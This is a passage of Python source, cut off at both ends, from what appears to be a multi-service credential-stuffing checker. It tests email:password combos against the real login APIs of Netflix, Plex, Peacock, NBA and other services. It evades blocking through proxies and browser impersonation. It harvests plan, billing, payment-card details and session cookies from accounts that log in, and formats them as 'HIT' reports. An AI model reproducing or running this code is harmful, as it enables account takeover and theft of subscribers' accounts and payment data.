            "X-Netflix.context.ui-Flavor": "akira",
            "Accept-Language": f"en-{country}",
            "X-Netflix.request.toplevel.uuid": uuid_val,
            "X-Netflix.request.attempt": "1",
            "User-Agent": ua,
            "X-Netflix.request.client.context": '{"appstate":"foreground"}',
            "Origin": "https://www.netflix.com",
            "Referer": "https://www.netflix.com/",
        }
        try:
            try:
                r_graphql = session.post(
                    "https://web.prod.cloud.netflix.com/graphql",
                    headers=graphql_headers,
                    data=graphql_body,
                    proxies=proxies,
                    timeout=30,
                    impersonate="chrome124",
                )
            except TypeError:
                r_graphql = session.post(
                    "https://web.prod.cloud.netflix.com/graphql",
                    headers=graphql_headers,
                    data=graphql_body,
                    proxies=proxies,
                    timeout=30,
                )
            graphql_src = r_graphql.text or ""
        except Exception as e:
            return {"status": "error", "message": f"graphql:{str(e)[:80]}"}

        if "Incorrect password for " in graphql_src or 'mode":"login' in graphql_src:
            return {"status": "bad", "message": "Invalid credentials"}

        if "Navigating to /browse" in graphql_src or 'universal":"/browse"' in graphql_src:
            status = "premium"
        elif 'universal":"/signup"' in graphql_src or '"mode":"welcome"' in graphql_src:
            status = "free"
        elif '"membershipStatus":"FORMER_MEMBER"' in graphql_src or '"membershipStatus":"NEVER_MEMBER"' in graphql_src:
            status = "free"
        else:
            if r_graphql.status_code in (403, 503) or "Something went wrong" in graphql_src:
                return {"status": "error", "message": "rate_limit_or_block"}
            return {"status": "bad", "message": "Invalid credentials"}

        # account enrich
        account_src = ""
        try:
            try:
                r_account = session.get(
                    "https://www.netflix.com/account",
                    headers={"User-Agent": ua, "Accept": "text/html", "Referer": "https://www.netflix.com/"},
                    proxies=proxies,
                    timeout=self.timeout,
                    impersonate="chrome124",
                )
            except TypeError:
                r_account = session.get(
                    "https://www.netflix.com/account",
                    headers={"User-Agent": ua, "Accept": "text/html", "Referer": "https://www.netflix.com/"},
                    proxies=proxies,
                    timeout=self.timeout,
                )
            account_src = r_account.text or ""
        except Exception:
            account_src = ""

        def grab(src, key, default="-"):
            try:
                if key not in src:
                    return default
                return src.split(key)[1].split('"')[0] or default
            except Exception:
                return default

        def unescape_nf(s):
            if not s or s == "-":
                return s
            try:
                s = s.replace("\\x20", " ").replace("\\x28", "(").replace("\\x29", ")")
                return bytes(s, "utf-8").decode("unicode_escape")
            except Exception:
                return s

        plan = unescape_nf(grab(account_src, '"fieldGroup":"MemberPlan","fields":{"localizedPlanName":{"fieldType":"String","value":"'))
        plan_price = unescape_nf(grab(account_src, '"planPrice":{"fieldType":"String","value":"'))
        video_quality = grab(account_src, '"videoQuality":{"fieldType":"String","value":"')
        streams = grab(account_src, '"maxStreams":{"fieldType":"Numeric","value":').rstrip("},")
        if streams and streams[0].isdigit() is False:
            try:
                streams = account_src.split('"maxStreams":{"fieldType":"Numeric","value":')[1].split("}")[0]
            except Exception:
                streams = "-"
        next_billing = unescape_nf(grab(account_src, '"nextBillingDate":{"fieldType":"String","value":"'))
        member_since = unescape_nf(grab(account_src, '"memberSince":"'))
        payment_method = grab(account_src, '"paymentMethod":{"fieldType":"String","value":"')
        signup_country = grab(account_src, '"countryOfSignup":"', country)

        if '"CURRENT_MEMBER":true' in account_src:
            member_status = "CURRENT_MEMBER"
        elif '"NEVER_MEMBER":true' in account_src:
            member_status = "NEVER_MEMBER"
        elif '"FORMER_MEMBER":true' in account_src:
            member_status = "FORMER_MEMBER"
        else:
            member_status = "UNKNOWN"

        try:
            secure_cookie = session.cookies.get("SecureNetflixId", "") if hasattr(session, "cookies") else ""
            netflix_id2 = session.cookies.get("NetflixId", "") if hasattr(session, "cookies") else netflix_id
        except Exception:
            secure_cookie = ""
            netflix_id2 = netflix_id
        cookies = f"NetflixId={netflix_id2};SecureNetflixId={secure_cookie}"

        out_status = "premium" if status == "premium" else "free"
        country_fmt = format_country(signup_country) if "format_country" in globals() else signup_country
        zip_line = (
            f"{email}:{password} | Status:{out_status.upper()} | Plan:{plan} | Price:{plan_price} | "
            f"Streams:{streams} | Quality:{video_quality} | NextBill:{next_billing} | "
            f"MemberSince:{member_since} | Country:{signup_country} | Payment:{payment_method} | "
            f"MemberStatus:{member_status} | by {CONTACT_ADMIN}"
        )
        hit_text = (
            f"{E('success') if out_status == 'premium' else E('unlock')} <b>{'HIT' if out_status == 'premium' else 'FREE'}</b> — Netflix {E('gem') if out_status == 'premium' else E('star')}\n\n"
            f"{E('mail')} <b>Account</b> ➜ <code>{email}:{password}</code>\n"
            f"{E('ok1')} <b>Status</b> ➜ {out_status.upper()}\n"
            f"{E('spark')} <b>Plan</b> ➜ {plan}\n"
            f"{E('cash')} <b>Price</b> ➜ {plan_price}\n"
            f"{E('bolt')} <b>Streams</b> ➜ {streams}\n"
            f"{E('fire')} <b>Quality</b> ➜ {video_quality}\n"
            f"{E('cal')} <b>Next Billing</b> ➜ {next_billing}\n"
            f"{E('time')} <b>Member Since</b> ➜ {member_since}\n"
            f"{E('world')} <b>Country</b> ➜ {country_fmt}\n"
            f"{E('card')} <b>Payment</b> ➜ {payment_method}\n"
            f"{E('star')} <b>Member Status</b> ➜ {member_status}\n\n"
            f"{E('crown')} <b>Made By</b> ➜ {CONTACT_ADMIN}"
        )
        return {
            "status": out_status,
            "message": member_status,
            "plan": plan,
            "plan_price": plan_price,
            "streams": streams,
            "video_quality": video_quality,
            "next_billing": next_billing,
            "member_since": member_since,
            "country": signup_country,
            "payment": payment_method,
            "member_status": member_status,
            "cookies": cookies,
            "zip_line": zip_line,
            "hit_line": zip_line,
            "hit_text": hit_text,
        }



class PlutoChecker:
    def __init__(self, proxy=None, timeout=12):
        self.proxy = proxy
        self.timeout = timeout

    def check(self, email: str, password: str, proxy=None) -> Dict:
        proxy = proxy or self.proxy
        max_retries = 1
        for attempt in range(max_retries):
            try:
                return self._check_internal(email, password, proxy)
            except Exception as e:
                if attempt == max_retries - 1:
                    return {"status": "error", "message": str(e)[:80]}
                pass
        return {"status": "error", "message": "Max retries"}

    def _check_internal(self, email, password, proxy):
        session = requests.Session()
        device_id = str(uuid.uuid4())
        session.cookies.set("ptv_device_id", device_id)
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}
        headers = {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json',
            'origin': 'https://pluto.tv',
            'referer': 'https://pluto.tv/us/account/sign-in/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'request-source': 'signIn',
        }
        query = """mutation SignIn($formFields: SignInFormFields!) {
          signIn(formFields: $formFields) { userId success message messages maxLoginAttempts }
        }"""
        payload = {
            "query": query,
            "variables": {"formFields": {"email": email, "password": password, "rememberMe": 1}},
            "operationName": "SignIn"
        }
        resp = session.post("https://pluto.tv/api/tn/signup/graphql/", json=payload, headers=headers, timeout=self.timeout)
        if resp.status_code != 200:
            return {"status": "error", "message": f"HTTP {resp.status_code}"}
        data = resp.json()
        if 'errors' in data:
            err = data['errors'][0] if data['errors'] else {}
            code = err.get('extensions', {}).get('code', '')
            if code == 'INVALID_CREDENTIALS':
                return {"status": "bad", "message": "Invalid credentials"}
            return {"status": "error", "message": err.get('message', 'error')}
        signin = data.get('data', {}).get('signIn') or {}
        if not signin.get('success'):
            msg = signin.get('message') or ', '.join(signin.get('messages') or []) or 'Login failed'
            return {"status": "bad", "message": msg}
        return {
            "status": "valid",
            "user_id": signin.get('userId'),
            "message": f"UserID: {signin.get('userId')} | Type: FREE",
            "country": "",
        }

# ----- 14. Plex Checker -----
class PlexChecker:
    def __init__(self, proxy=None, timeout=12):
        self.proxy = proxy
        self.timeout = timeout

    def check(self, email: str, password: str, proxy=None) -> Dict:
        proxy = proxy or self.proxy
        max_retries = 1
        for attempt in range(max_retries):
            try:
                return self._check_internal(email, password, proxy)
            except Exception as e:
                if attempt == max_retries - 1:
                    return {"status": "error", "message": str(e)[:80]}
                pass
        return {"status": "error", "message": "Max retries"}

    def _check_internal(self, email, password, proxy):
        try:
            session = curl_requests.Session()
            session.impersonate = "chrome131"
        except Exception:
            session = requests.Session()
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}
        headers = {
            'Content-Type': 'application/json',
            'x-plex-client-identifier': str(uuid.uuid4()),
            'x-plex-device': 'Android',
            'x-plex-platform': 'Chrome',
            'x-plex-product': 'Plex Mediaverse',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) Chrome/139.0.0.0 Mobile Safari/537.36',
            'Origin': 'https://watch.plex.tv',
            'Referer': 'https://watch.plex.tv/',
            'Accept': 'application/json',
        }
        payload = {'login': email, 'password': password, 'rememberMe': True}
        resp = session.post('https://plex.tv/api/v2/users/signin', headers=headers, json=payload, timeout=self.timeout)
        if resp.status_code == 201:
            data = resp.json()
            token = data.get('authToken') or data.get('authentication_token')
            sub = data.get('subscription') or {}
            plan = sub.get('plan') or 'Free'
            status_text = sub.get('status', 'Unknown')
            expires = sub.get('expires_at', 'N/A')
            country = data.get('country', 'N/A')
            is_premium = bool(plan and plan != "Free" and str(status_text).lower() == "active")
            return {
                "status": "premium" if is_premium else "free",
                "plan": plan,
                "status_text": status_text,
                "expires_at": expires,
                "country": country,
                "token": (token or '')[:12] + '...' if token else 'N/A',
                "message": f"Plan: {plan} | Status: {status_text} | Country: {format_country(country)} | Exp: {expires}",
            }
        if resp.status_code == 401:
            return {"status": "bad", "message": "Invalid credentials"}
        if resp.status_code == 429:
            return {"status": "error", "message": "Rate limited"}
        return {"status": "error", "message": f"HTTP {resp.status_code}"}

# ----- 15. Peacock Checker -----
class PeacockChecker:
    def __init__(self, proxy=None, timeout=12):
        self.proxy = proxy
        self.timeout = timeout
        self.android_ua = (
            "PeacockAndroid-US/Mozilla/5.0 (Linux; Android 10; K) "
            "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"
        )

    def check(self, email: str, password: str, proxy=None) -> Dict:
        proxy = proxy or self.proxy
        max_retries = 1
        for attempt in range(max_retries):
            try:
                return self._check_internal(email, password, proxy)
            except Exception as e:
                if attempt == max_retries - 1:
                    return {"status": "error", "message": str(e)[:80]}
                pass
        return {"status": "error", "message": "Max retries"}

    def _check_internal(self, email, password, proxy):
        session = requests.Session()
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}
        url = (
            "https://rango.id.peacocktv.com/signin/service/international"
            "?continuationUrl=https%3A%2F%2Frango.id.peacocktv.com%2Foauth%2Fauthorize"
            "%2Fservice%2Finternational%3Fresponse_type%3Dtoken"
            "%26client_id%3Dnbcu_iphone%26redirect_uri%3Dnbcu%3A%2F%2Fauth"
            "%26api_id%3Doauth"
        )
        headers = {
            'accept': 'application/vnd.siren+json',
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': self.android_ua,
            'x-skyott-proposition': 'NBCUOTT',
            'x-skyott-provider': 'NBCU',
            'x-skyott-territory': 'US',
        }
        body = f"userIdentifier={urlparse.quote(email)}&password={urlparse.quote(password)}"
        r = session.post(url, data=body, headers=headers, timeout=self.timeout, allow_redirects=False)
        text = r.text or ''
        if r.status_code == 422 or '"eventType":"error"' in text:
            return {"status": "bad", "message": "Invalid credentials"}
        if r.status_code == 429:
            return {"status": "error", "message": "Rate limited"}
        if r.status_code not in (200, 201) or '"eventType":"success"' not in text:
            return {"status": "error", "message": f"HTTP {r.status_code}"}
        return {
            "status": "valid",
            "message": "Login successful",
            "country": "US",
        }

# ----- 16. MakeMusic Checker -----
class MakeMusicChecker:
    def __init__(self, proxy=None, timeout=12):
        self.proxy = proxy
        self.timeout = timeout

    def check(self, email: str, password: str, proxy=None) -> Dict:
        proxy = proxy or self.proxy
        max_retries = 1
        for attempt in range(max_retries):
            try:
                return self._check_internal(email, password, proxy)
            except Exception as e:
                if attempt == max_retries - 1:
                    return {"status": "error", "message": str(e)[:80]}
                pass
        return {"status": "error", "message": "Max retries"}

    def _check_internal(self, email, password, proxy):
        session = requests.Session()
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}
        session.headers.update({
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        })
        login_url = "https://auth.makemusic.com/identity/account/login"
        params = {"returnUrl": "https://home.makemusic.com/"}
        resp = session.get(login_url, params=params, timeout=self.timeout)
        if resp.status_code != 200:
            return {"status": "error", "message": f"GET login failed: {resp.status_code}"}
        m = re.search(r'name="__RequestVerificationToken"[^>]*value="([^"]+)"', resp.text)
        if not m:
            return {"status": "error", "message": "CSRF token not found"}
        csrf = m.group(1)
        data = {
            "ReturnUrl": "https://home.makemusic.com/",
            "Username": email,
            "Password": password,
            "button": "login",
            "__RequestVerificationToken": csrf,
        }
        post_headers = {
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://auth.makemusic.com',
            'referer': login_url + '?returnUrl=https%3A%2F%2Fhome.makemusic.com%2F',
        }
        post_resp = session.post(login_url, params=params, data=data, headers=post_headers,
                                 timeout=self.timeout, allow_redirects=True)
        if post_resp.status_code == 200 and ('incorrect' in post_resp.text.lower() or 'invalid' in post_resp.text.lower()):
            return {"status": "bad", "message": "Invalid credentials"}
        if post_resp.status_code == 401:
            return {"status": "bad", "message": "Invalid credentials"}
        if post_resp.status_code >= 400:
            return {"status": "error", "message": f"HTTP {post_resp.status_code}"}
        return {"status": "valid", "message": "Login successful", "country": ""}

# ----- 17. Tabii Checker -----
class TabiiChecker:
    def __init__(self, proxy=None, timeout=12):
        self.proxy = proxy
        self.timeout = timeout
        self.device_id = f"{int(time.time()*1000)}_{random.randint(100000,999999)}"

    def check(self, email: str, password: str, proxy=None) -> Dict:
        proxy = proxy or self.proxy
        max_retries = 1
        for attempt in range(max_retries):
            try:
                return self._check_internal(email, password, proxy)
            except Exception as e:
                if attempt == max_retries - 1:
                    return {"status": "error", "message": str(e)[:80]}
                pass
        return {"status": "error", "message": "Max retries"}

    def _build_headers(self, token=None):
        headers = {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json',
            'device-id': self.device_id,
            'device-language': 'en-IN',
            'device-os-name': 'Android',
            'device-os-version': '10',
            'origin': 'https://www.tabii.com',
            'platform': 'Web-Mobile',
            'referer': 'https://www.tabii.com/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'x-country-code': 'US',
        }
        if token:
            headers['Authorization'] = f'Bearer {token}'
        return headers

    def _check_internal(self, email, password, proxy):
        session = requests.Session()
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}
        url = "https://eu1.tabii.com/apigateway/auth/v2/login"
        payload = {"email": email, "password": password, "remember": False}
        resp = session.post(url, json=payload, headers=self._build_headers(), timeout=self.timeout)
        if resp.status_code == 200:
            data = resp.json()
            token = data.get('accessToken')
            if not token:
                return {"status": "error", "message": "No token"}
            me = session.get("https://eu1.tabii.com/apigateway/auth/v2/me",
                             headers=self._build_headers(token), timeout=self.timeout)
            if me.status_code == 200:
                user = me.json()
                sub = user.get('subscription') or {}
                plan = sub.get('title', 'Free')
                if str(plan).lower() in ('ücretsiz', 'ucretsiz'):
                    plan = 'Free'
                status_text = sub.get('status', user.get('state', 'Unknown'))
                country = user.get('subscriptionCountryCode', 'N/A')
                is_premium = str(status_text).lower() == 'active' and plan.lower() != 'free'
                return {
                    "status": "premium" if is_premium else "free",
                    "plan": plan,
                    "status_text": status_text,
                    "country": country,
                    "name": user.get('name', 'N/A'),
                    "message": f"Plan: {plan} | Status: {status_text} | Country: {format_country(country)}",
                }
            return {"status": "free", "message": "Login ok, no profile", "country": ""}
        if resp.status_code in (400, 401):
            return {"status": "bad", "message": "Invalid credentials"}
        if resp.status_code == 403:
            return {"status": "bad", "message": "Blocked/region locked"}
        if resp.status_code == 429:
            return {"status": "error", "message": "Rate limited"}
        return {"status": "error", "message": f"HTTP {resp.status_code}"}

# ----- 18. Playabl Checker -----
class PlayablChecker:
    def __init__(self, proxy=None, timeout=12):
        self.proxy = proxy
        self.timeout = timeout

    def check(self, email: str, password: str, proxy=None) -> Dict:
        proxy = proxy or self.proxy
        max_retries = 1
        for attempt in range(max_retries):
            try:
                return self._check_internal(email, password, proxy)
            except Exception as e:
                if attempt == max_retries - 1:
                    return {"status": "error", "message": str(e)[:80]}
                pass
        return {"status": "error", "message": "Max retries"}

    def _check_internal(self, email, password, proxy):
        session = requests.Session()
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}
        headers = {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json',
            'origin': 'https://playabl.ai',
            'referer': 'https://playabl.ai/en/auth/login',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        }
        resp = session.post("https://playabl.ai/api/v1/authentication/signin",
                            json={"email": email, "password": password},
                            headers=headers, timeout=self.timeout)
        if resp.status_code == 200:
            data = resp.json()
            if data.get('error') or data.get('errors'):
                err = data.get('error') or data.get('errors')
                return {"status": "bad", "message": str(err)}
            user = data.get('data') or data
            return {
                "status": "valid",
                "username": user.get('username') or user.get('fullName'),
                "id": user.get('id'),
                "message": f"ID: {user.get('id')} | User: {user.get('username', 'N/A')}",
                "country": user.get('country', ''),
            }
        if resp.status_code == 401:
            return {"status": "bad", "message": "Invalid credentials"}
        return {"status": "error", "message": f"HTTP {resp.status_code}"}


# ----- 12. Multi-Checker: runs all checkers on each combo (Premium only) -----

# =============================================================================
# NBA Checker (ported from NBA TV tool — credit retagged to @samvir1)
# =============================================================================
NBA_CLIENT_ID = "d3S9lWRVmuunNhQ5_0xnyHB-Q3gpEXCrCmdgePkELTw"
NBA_USER_AGENT = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"
NBA_NEWRELIC_ID = "VwcFU1BTCRABVlZRBAgDX1cG"
NBA_PAYMENT_KEY = "a08524b6b2cfb31633344639fe7f482cfbd216ccc135dcdb263cbb3b3a25c9970a444685dfa94d7876e66162347725d19c651639b1584a33d9256037485141f4"
NBA_AUTHOR = "@samvir1"


def _nba_ts_to_date(ms):
    if not ms:
        return "N/A"
    try:
        if ms is None:
            return "N/A"
        try:
            return datetime.fromtimestamp(int(ms) / 1000, timezone.utc).strftime("%Y-%m-%d")
        except Exception:
            return "N/A"
    except Exception:
        return "N/A"


def _nba_format_proxy(proxy):
    if not proxy:
        return None
    proxy = str(proxy).strip()
    if proxy.startswith("http"):
        return proxy
    parts = proxy.split(":")
    if len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    if "@" in proxy:
        return f"http://{proxy}"
    return f"http://{proxy}"


class NBAChecker:
    """NBA identity.nba.com login + optional payment/subscription enrichment."""

    def __init__(self, proxy=None):
        self.proxy = _nba_format_proxy(proxy) if proxy else None
        self.timeout = 25
        try:
            from curl_cffi import requests as cffi_requests
            self.session = cffi_requests.Session(impersonate="chrome")
            self._use_cffi = True
        except Exception:
            self.session = requests.Session()
            self._use_cffi = False

    def _proxies(self):
        if not self.proxy:
            return None
        return {"http": self.proxy, "https": self.proxy}

    def _login_headers(self):
        return {
            "accept": "application/json",
            "accept-encoding": "gzip",
            "connection": "Keep-Alive",
            "content-type": "application/json; charset=UTF-8",
            "host": "identity.nba.com",
            "user-agent": NBA_USER_AGENT,
            "x-client-id": NBA_CLIENT_ID,
            "X-NewRelic-ID": NBA_NEWRELIC_ID,
        }

    def _post(self, url, **kwargs):
        kwargs.setdefault("timeout", self.timeout)
        kwargs.setdefault("proxies", self._proxies())
        if self._use_cffi:
            return self.session.post(url, **kwargs)
        return self.session.post(url, **kwargs)

    def _get(self, url, **kwargs):
        kwargs.setdefault("timeout", self.timeout)
        kwargs.setdefault("proxies", self._proxies())
        if self._use_cffi:
            return self.session.get(url, **kwargs)
        return self.session.get(url, **kwargs)

    def _login(self, email, password):
        url = "https://identity.nba.com/api/v1/auth?"
        payload = {"email": email, "password": password, "rememberMe": False}
        headers = self._login_headers()
        try:
            r = self._post(url, json=payload, headers=headers)
        except Exception as e:
            msg = str(e).lower()
            if "timeout" in msg:
                return {"status": "error", "message": "timeout"}
            if "proxy" in msg:
                return {"status": "error", "message": "proxy error"}
            return {"status": "error", "message": str(e)[:100]}

        text = r.text or ""
        low = text.lower()
        if r.status_code == 403 and ("access denied" in low or "edgesuite" in low or "<html" in low):
            return {"status": "error", "message": "akamai block"}
        if r.status_code == 429:
            return {"status": "error", "message": "rate_limit"}
        if r.status_code in (401, 403):
            return {"status": "bad", "message": "Invalid credentials"}
        if r.status_code in (502, 504):
            return {"status": "error", "message": f"gateway {r.status_code}"}
        if r.status_code not in (200, 201):
            return {"status": "error", "message": f"HTTP {r.status_code}"}

        try:
            body = r.json()
        except Exception:
            return {"status": "error", "message": "bad json"}

        # credentials wrong shapes
        if body.get("error") or body.get("errors"):
            err = body.get("error") or body.get("errors")
            return {"status": "bad", "message": str(err)[:80]}

        user = {
            "email": email,
            "given_name": body.get("firstName") or body.get("given_name") or body.get("first_name") or "N/A",
            "family_name": body.get("lastName") or body.get("family_name") or body.get("last_name") or "N/A",
            "dob": body.get("dob") or body.get("dateOfBirth") or "N/A",
            "membership_id": body.get("membershipId") or body.get("membership_id") or "N/A",
            "evergent_id": body.get("evergentId") or body.get("evergent_id") or "N/A",
            "country": body.get("country") or body.get("countryCode") or "N/A",
        }
        jwt = (
            body.get("accessToken")
            or body.get("access_token")
            or body.get("token")
            or body.get("idToken")
            or ""
        )
        if not jwt and isinstance(body.get("data"), dict):
            data = body["data"]
            jwt = data.get("accessToken") or data.get("access_token") or data.get("token") or ""
            for k, v in data.items():
                if k not in user or user[k] in ("N/A", "", None):
                    if isinstance(v, (str, int, float, bool)):
                        user[k] = v

        user["jwt"] = jwt
        if not jwt:
            # still valid login sometimes without jwt for profile-only
            return {
                "status": "valid",
                "message": "Login OK",
                "plan": "Login OK",
                "country": user.get("country", "N/A"),
                "user": user.get("given_name", "N/A"),
                "checked_by": NBA_AUTHOR,
            }

        # optional subscription enrich
        try:
            sub = self._fetch_subscription(jwt)
        except Exception:
            sub = None
        if sub:
            user.update(sub)

        plan = user.get("plan") or "Login OK"
        status_out = "premium" if user.get("has_subscription") or user.get("league_pass") else "valid"
        out = {
            "status": status_out,
            "message": "Login successful" if status_out == "valid" else "League Pass / Active sub",
            "plan": plan,
            "streams": user.get("sub_count", "N/A"),
            "next_billing": user.get("next_payment", "N/A"),
            "next_payment": user.get("next_payment", "N/A"),
            "auto_renew": user.get("renewal_bool", "N/A"),
            "renewal_bool": user.get("renewal_bool", "N/A"),
            "expires": user.get("expires", "N/A"),
            "start_date": user.get("start_date", "N/A"),
            "country": user.get("country", "N/A"),
            "payment": user.get("payment_type", user.get("payment", "N/A")),
            "payment_type": user.get("payment_type", user.get("payment", "N/A")),
            "plan_base": user.get("sku", "N/A"),
            "sku": user.get("sku", "N/A"),
            "price": user.get("price", "N/A"),
            "sub_status": user.get("sub_status", status_out),
            "user": (str(user.get("given_name", "")) + " " + str(user.get("family_name", ""))).strip() or "N/A",
            "verified": "N/A",
            "league_pass": "Yes" if user.get("league_pass") else "No",
            "card_type": user.get("card_type", "N/A"),
            "card_last4": user.get("card_last4", "N/A"),
            "card_expiry": user.get("card_expiry", "N/A"),
            "checked_by": NBA_AUTHOR,
        }
        out["hit_text"] = (
            f"{E('success')} <b>HIT</b> - NBA {E('gem')}\n\n"
            f"<b>Account</b> ➜ <code>{email}:{password}</code>\n"
            f"<b>subscriptionStatus</b> = {out.get('sub_status')}\n"
            f"<b>Subscription Name</b> = {out.get('plan')}\n"
            f"<b>Price</b> = {out.get('price')}\n"
            f"<b>Renowal</b> = {out.get('renewal_bool')}\n"
            f"<b>StartDate</b> = {out.get('start_date')}\n"
            f"<b>Next Payement</b> = {out.get('next_payment')}\n"
            f"<b>Payement Method</b> = {out.get('payment')}\n"
            f"<b>cardType</b> = {out.get('card_type')}\n"
            f"<b>Last 4</b> = {out.get('card_last4')}\n"
            f"<b>ExpiryDate</b> = {out.get('expires')}\n"
            f"<b>Country</b> = {out.get('country')}\n"
            f"<b>LP</b> = {out.get('league_pass')}\n\n"
            f"<b>Made By</b> ➜ {NBA_AUTHOR}"
        )
        return out

    def _fetch_subscription(self, jwt):
        # Best-effort payment.nba.com style enrichment; never crash checker
        headers = {
            "accept": "application/json",
            "authorization": f"Bearer {jwt}",
            "user-agent": NBA_USER_AGENT,
            "x-client-id": NBA_CLIENT_ID,
        }
        out = {}
        try:
            # profile
            r = self._get("https://identity.nba.com/api/v1/profile", headers=headers)
            if r.status_code in (200, 201):
                try:
                    p = r.json()
                    if isinstance(p, dict):
                        out["given_name"] = p.get("firstName") or p.get("given_name") or out.get("given_name", "N/A")
                        out["family_name"] = p.get("lastName") or p.get("family_name") or out.get("family_name", "N/A")
                        out["country"] = p.get("country") or p.get("countryCode") or out.get("country", "N/A")
                except Exception:
                    pass
        except Exception:
            pass
        try:
            # subscription proxy endpoint (may change; tolerate failure)
            r = self._get(
                "https://payment.nba.com/proxy/subscription",
                headers={
                    **headers,
                    "x-api-key": NBA_PAYMENT_KEY[:32] if NBA_PAYMENT_KEY else "",
                },
            )
            if r.status_code in (200, 201):
                data = r.json() if r.text else {}
                acct = (data.get("account") or {}) if isinstance(data, dict) else {}
                pay = (data.get("payment") or {}) if isinstance(data, dict) else {}
                subs = (data.get("subs") or data.get("subscriptions") or []) if isinstance(data, dict) else []
                if pay.get("type"):
                    out["payment"] = pay["type"]
                    out["payment_type"] = pay["type"]
                if pay.get("card_type"):
                    out["card_type"] = pay["card_type"]
                if pay.get("card_number"):
                    cn = str(pay["card_number"])
                    out["card_last4"] = cn[-4:] if len(cn) >= 4 else cn
                out["sub_count"] = len(subs) if isinstance(subs, list) else 0
                if isinstance(subs, list) and subs:
                    s = subs[0]
                    out["has_subscription"] = True
                    out["plan"] = s.get("displayName") or s.get("serviceName") or "N/A"
                    out["sub_status"] = s.get("subscriptionStatus") or s.get("status") or "N/A"
                    out["sku"] = s.get("serviceID") or "N/A"
                    out["country"] = s.get("orderCountry") or out.get("country", "N/A")
                    out["next_payment"] = _nba_ts_to_date(s.get("nextBillingDateTime") or s.get("validityTill"))
                    out["expires"] = _nba_ts_to_date(s.get("validityTill"))
                    out["renewal_bool"] = "true" if s.get("isRenewal") else "false"
                    attrs = {
                        a.get("attributeName"): a.get("attributeValue")
                        for a in (s.get("productAttributes") or [])
                        if isinstance(a, dict)
                    }
                    out["league_pass"] = attrs.get("IsLPSubscription") == "Yes" or "BLP" in str(out.get("sku", "")).upper()
        except Exception:
            pass
        return out

    def check(self, email, password, proxy=None):
        if proxy:
            self.proxy = _nba_format_proxy(proxy)
        try:
            return self._login(email, password)
        except Exception as e:
            return {"status": "error", "message": str(e)[:100]}




# =============================================================================
# Paramount+ Checker (ported — credit @samvir1)
# =============================================================================
PARAMOUNT_BASE = "https://www.paramountplus.com"
PARAMOUNT_AUTHOR = "@samvir1"
DEBUG = False
PARAMOUNT_UA = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"

COMMON_HEADERS = {
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': PARAMOUNT_UA,
    'x-requested-with': 'XMLHttpRequest',
}



def _walk_json(obj, path=""):
    if isinstance(obj, dict):
        for k, v in obj.items():
            new_path = f"{path}.{k}" if path else k
            yield new_path, v
            yield from _walk_json(v, new_path)
    elif isinstance(obj, list):
        for i, item in enumerate(obj):
            yield from _walk_json(item, f"{path}[{i}]")


_DATE_KEY_HINTS = (
    'expire', 'expiry', 'expiration', 'end_date', 'enddate', 'ends_at',
    'next_bill', 'nextbill', 'renew', 'renewal', 'valid_until', 'validuntil',
    'period_end', 'current_period_end', 'periodend', 'cancel_at', 'cancelat',
    'trial_end', 'trialend',
)


def _parse_date_value(v):
    if v is None or v == "":
        return None
    if isinstance(v, (int, float)) and v > 1000000000:
        try:
            try:
                if v is None:
                    return None
                return datetime.fromtimestamp(v / 1000 if v > 1e12 else v).strftime('%Y-%m-%d')
            except Exception:
                return None
        except Exception:
            return None
    if isinstance(v, str):
        s = v.strip()
        if not s or s.lower() in ('null', 'none', 'false', 'true'):
            return None
        m = re.match(r'^(\d{4})-(\d{2})-(\d{2})', s)
        if m:
            return f"{m.group(1)}-{m.group(2)}-{m.group(3)}"
        m = re.match(r'^(\d{4})/(\d{2})/(\d{2})', s)
        if m:
            return f"{m.group(1)}-{m.group(2)}-{m.group(3)}"
        m = re.match(r'^(\d{2})/(\d{2})/(\d{4})', s)
        if m:
            return f"{m.group(3)}-{m.group(2)}-{m.group(1)}"
    return None


def _hunt_plan_end(*sources):
    candidates = []
    for src in sources:
        if not src:
            continue
        for path, value in _walk_json(src):
            lpath = path.lower()
            if any(h in lpath for h in _DATE_KEY_HINTS):
                parsed = _parse_date_value(value)
                if parsed:
                    depth = lpath.count('.')
                    priority = 0
                    for weight_key in ('next', 'renew', 'expire', 'end', 'period'):
                        if weight_key in lpath:
                            priority -= 1
                    candidates.append((priority, depth, parsed, path))
    if not candidates:
